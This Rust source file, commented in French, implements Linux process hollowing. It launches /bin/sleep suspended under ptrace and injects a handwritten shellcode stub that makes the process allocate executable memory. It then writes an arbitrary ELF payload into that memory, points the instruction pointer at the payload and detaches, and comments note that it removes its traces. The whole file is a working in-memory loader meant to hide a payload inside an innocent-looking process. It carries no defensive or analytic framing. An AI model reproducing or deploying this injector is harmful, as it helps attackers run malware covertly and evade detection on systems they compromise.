#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use std::ffi::CString;
use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write};
use std::mem;
use std::os::unix::ffi::OsStrExt;
use std::process::exit;
use std::ptr;

#[cfg(target_os = "linux")]
use libc::{
    c_void, pid_t, ptrace, user_regs_struct, waitpid, PTRACE_ATTACH, PTRACE_CONT,
    PTRACE_DETACH, PTRACE_GETREGS, PTRACE_PEEKTEXT, PTRACE_POKETEXT, PTRACE_SETREGS,
    PTRACE_TRACEME, WIFSTOPPED, WSTOPSIG, SIGTRAP, Elf64_Ehdr, Elf64_Phdr, PT_LOAD
};

// =============================================================
// LINUX: PROCESS HOLLOWING (SPAWN, ALLOCATE & INJECT)
// =============================================================
#[cfg(target_os = "linux")]
pub fn linux_mem_exec(payload: Vec<u8>) {
    unsafe {
        // 1. Démarrer le processus hôte (sleep) en état suspendu
        let pid = spawn_suspended_process("/bin/sleep", &["sleep", "999999"]);
        if pid < 0 {
            println!("[-] Échec du lancement du processus hôte.");
            return;
        }
        println!("[+] Processus hôte lancé et suspendu (PID: {})", pid);

        // 2. Récupérer l'état initial des registres
        let mut regs: user_regs_struct = mem::zeroed();
        ptrace(PTRACE_GETREGS, pid, ptr::null_mut::<c_void>(), &mut regs as *mut _ as *mut c_void);
        let original_rip = regs.rip;

        // 3. Forcer le processus à allouer de la mémoire (mmap)
        println!("[*] Allocation de {} octets dans le processus distant...", payload.len());
        let allocated_addr = force_mmap_allocation(pid, original_rip, payload.len());
        
        if allocated_addr == 0 || allocated_addr == u64::MAX {
            println!("[-] Échec de l'allocation mémoire.");
            ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
            return;
        }
        println!("[+] Mémoire allouée avec succès à l'adresse: {:#x}", allocated_addr);

        // 4. Analyser l'en-tête ELF et charger les segments en mémoire
        println!("[*] Analyse de l'en-tête ELF...");

        let ehdr_ptr = payload.as_ptr() as *const Elf64_Ehdr;
        let ehdr = &*ehdr_ptr;

        // Vérification des Magic Bytes (\x7F E L F)
        if ehdr.e_ident[0] != 0x7F || ehdr.e_ident[1] != 0x45 || ehdr.e_ident[2] != 0x4C || ehdr.e_ident[3] != 0x46 {
            println!("[-] Erreur : Le payload n'est pas un binaire ELF valide !");
            ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
            return;
        }

        println!("[+] Binaire ELF détecté. Entry Point : {:#x}", ehdr.e_entry);

        // Pointage vers la table des Program Headers
        let phdr_table = payload.as_ptr().add(ehdr.e_phoff as usize) as *const Elf64_Phdr;

        for i in 0..ehdr.e_phnum {
            let phdr = &*phdr_table.add(i as usize);

            // On ne s'intéresse qu'aux segments qui doivent être chargés en mémoire
            if phdr.p_type == PT_LOAD {
                let dest_addr = allocated_addr + phdr.p_vaddr;
                let src_start = phdr.p_offset as usize;
                let src_end = src_start + phdr.p_filesz as usize;

                // A. Copier le contenu réel du fichier vers la mémoire allouée
                if phdr.p_filesz > 0 && src_end <= payload.len() {
                    let segment_data = &payload[src_start..src_end];
                    write_memory(pid, dest_addr, segment_data);
                    println!("[+] Segment PT_LOAD mappé à {:#x} (taille fichier: {})", dest_addr, phdr.p_filesz);
                }

                // B. Gérer la section .bss (Variables non initialisées)
                // Si la taille requise en mémoire est plus grande que la taille dans le fichier,
                // le reste doit être rempli de zéros.
                if phdr.p_memsz > phdr.p_filesz {
                    let bss_size = (phdr.p_memsz - phdr.p_filesz) as usize;
                    let bss_addr = dest_addr + phdr.p_filesz;
                    let zeros = vec![0u8; bss_size];
                    write_memory(pid, bss_addr, &zeros);
                    println!("[+] Zone .bss (zéros) allouée à {:#x} (taille: {})", bss_addr, bss_size);
                }
            }
        }

        // 5. Rediriger le processeur vers le VRAI point d'entrée de l'ELF
        regs.rip = allocated_addr + ehdr.e_entry;
        println!("[*] Pointeur d'instruction (RIP) modifié vers : {:#x}", regs.rip);
        ptrace(PTRACE_SETREGS, pid, ptr::null_mut::<c_void>(), &mut regs as *mut _ as *mut c_void);

        // 6. Relâcher le processus (il exécutera notre code)
        println!("[+] Détournement terminé. Détachement du processus...");
        ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
    }
}

// -------------------------------------------------------------
// FONCTIONS UTILITAIRES
// -------------------------------------------------------------

#[cfg(target_os = "linux")]
unsafe fn spawn_suspended_process(path: &str, args: &[&str]) -> pid_t {
    let pid = libc::fork();
    
    if pid == 0 {
        // --- PROCESSUS ENFANT ---
        // On demande au noyau d'être tracé par le parent
        ptrace(PTRACE_TRACEME, 0, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
        
        let c_path = CString::new(path).unwrap();
        let mut c_args: Vec<*mut libc::c_char> = args.iter()
            .map(|arg| CString::new(*arg).unwrap().into_raw())
            .collect();
        c_args.push(ptr::null_mut()); // Terminaison par NULL requise par execvp
        
        // On remplace l'enfant par /bin/sleep. Le noyau va automatiquement
        // mettre le processus en pause juste avant la première instruction.
        libc::execvp(c_path.as_ptr(), c_args.as_ptr() as *const *const libc::c_char);
        exit(1); // Ne devrait jamais être atteint
    } else if pid > 0 {
        // --- PROCESSUS PARENT ---
        let mut status = 0;
        waitpid(pid, &mut status, 0); // On attend que l'enfant se mette en pause
        return pid;
    }
    
    -1 // Erreur de fork
}

#[cfg(target_os = "linux")]
unsafe fn force_mmap_allocation(pid: pid_t, instruction_ptr: u64, size: usize) -> u64 {
    // Shellcode x86_64 pour appeler sys_mmap(NULL, size, PROT_READ|WRITE|EXEC, MAP_PRIVATE|ANON, -1, 0)
    // Suivi d'un int 3 (SIGTRAP) pour redonner la main au parent
    let mut mmap_stub: Vec<u8> = vec![
        0x48, 0xC7, 0xC7, 0x00, 0x00, 0x00, 0x00,             // mov rdi, 0 (addr = NULL)
        0x48, 0xC7, 0xC6,                                     // mov rsi, size
    ];
    mmap_stub.extend_from_slice(&(size as u32).to_le_bytes()); // Ajout de la taille dynamique
    mmap_stub.extend_from_slice(&[
        0x48, 0xC7, 0xC2, 0x07, 0x00, 0x00, 0x00,             // mov rdx, 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
        0x49, 0xC7, 0xC2, 0x22, 0x00, 0x00, 0x00,             // mov r10, 0x22 (MAP_PRIVATE | MAP_ANONYMOUS)
        0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF,             // mov r8, -1 (fd)
        0x49, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,             // mov r9, 0 (offset)
        0x48, 0xC7, 0xC0, 0x09, 0x00, 0x00, 0x00,             // mov rax, 9 (sys_mmap)
        0x0F, 0x05,                                           // syscall
        0xCC                                                  // int 3 (SIGTRAP -> pause)
    ]);

    // 1. Sauvegarder les instructions originales à l'adresse RIP
    let backup_size = mmap_stub.len();
    let original_code = read_memory_ptrace(pid, instruction_ptr, backup_size);

    // 2. Écrire le shellcode mmap à la place
    write_memory_ptrace(pid, instruction_ptr, &mmap_stub);

    // 3. Relancer le processus pour qu'il exécute le mmap
    ptrace(PTRACE_CONT, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());

    // 4. Attendre qu'il atteigne l'instruction `int 3` (SIGTRAP)
    let mut status = 0;
    waitpid(pid, &mut status, 0);

    // 5. Récupérer l'adresse allouée qui se trouve dans le registre RAX
    let mut regs: user_regs_struct = mem::zeroed();
    ptrace(PTRACE_GETREGS, pid, ptr::null_mut::<c_void>(), &mut regs as *mut _ as *mut c_void);
    let new_memory_addr = regs.rax;

    // 6. Nettoyer nos traces : remettre le code original à sa place
    write_memory_ptrace(pid, instruction_ptr, &original_code);
    
    // Remettre le RIP à sa valeur d'origine pour ne pas crasher
    regs.rip = instruction_ptr;
    ptrace(PTRACE_SETREGS, pid, ptr::null_mut::<c_void>(), &mut regs as *mut _ as *mut c_void);

    new_memory_addr
}

#[cfg(target_os = "linux")]
unsafe fn write_memory(pid: pid_t, addr: u64, data: &[u8]) {
    // Utiliser /proc/[pid]/mem est beaucoup plus rapide et simple que PTRACE_POKETEXT 
    // pour écrire de gros blocs de données
    let mem_path = format!("/proc/{}/mem", pid);
    if let Ok(mut file) = OpenOptions::new().write(true).open(&mem_path) {
        if file.seek(SeekFrom::Start(addr)).is_ok() {
            let _ = file.write_all(data);
        }
    }
}

// Helpers pour ptrace (Lecture/Écriture mot par mot, 8 octets)
#[cfg(target_os = "linux")]
unsafe fn read_memory_ptrace(pid: pid_t, addr: u64, size: usize) -> Vec<u8> {
    let mut data = Vec::with_capacity(size);
    let mut current_addr = addr;
    while data.len() < size {
        let word = ptrace(PTRACE_PEEKTEXT, pid, current_addr as *mut c_void, ptr::null_mut::<c_void>());
        let bytes = word.to_ne_bytes();
        let to_copy = std::cmp::min(8, size - data.len());
        data.extend_from_slice(&bytes[..to_copy]);
        current_addr += 8;
    }
    data
}

#[cfg(target_os = "linux")]
unsafe fn write_memory_ptrace(pid: pid_t, addr: u64, data: &[u8]) {
    let mut current_addr = addr;
    let mut chunks = data.chunks(8);
    for chunk in chunks {
        let mut word = 0i64;
        unsafe { ptr::copy_nonoverlapping(chunk.as_ptr(), &mut word as *mut _ as *mut u8, chunk.len()); }
        ptrace(PTRACE_POKETEXT, pid, current_addr as *mut c_void, word as *mut c_void);
        current_addr += 8;
    }
}
